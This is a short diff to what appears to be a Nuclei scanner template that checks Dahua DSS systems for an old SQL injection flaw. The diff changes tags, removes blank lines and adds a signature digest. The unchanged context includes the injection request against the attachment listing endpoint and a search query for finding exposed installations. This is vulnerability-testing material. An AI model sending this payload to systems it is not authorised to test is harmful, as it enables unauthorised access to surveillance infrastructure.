@@ -10,7 +10,7 @@ info:
     verified: true
     max-request: 2
     fofa-query: "app=\"dahua-DSS\""
-  tags: cnvd,cnvd2017,sqli,dahua,vuln
+  tags: cnvd,cnvd2017,sqli,dahua
 variables:
   num: "999999999"
 
@@ -21,7 +21,6 @@ http:
       - "{{BaseURL}}/portal/attachment_getAttList.action?bean.RecId=1') AND EXTRACTVALUE(534543,CONCAT(0x5c,md5({{num}}),0x5c)) AND ('n72Yk'='n72Yk&bean.TabName=1"
 
     stop-at-first-match: true
-
     matchers-condition: and
     matchers:
       - type: word
@@ -34,4 +33,4 @@ http:
       - type: status
         status:
           - 200
-
+# digest: 490a0046304402201473c48150a393eeb0801323af0b0e94147a66a15315b3c0cb476027ce5f6c880220684bd14e88b482a6ed2d4707b2bef6916911ba91ca0cb9fe97f6396c14476607:922c64590222798bb761d5b6d8e72950
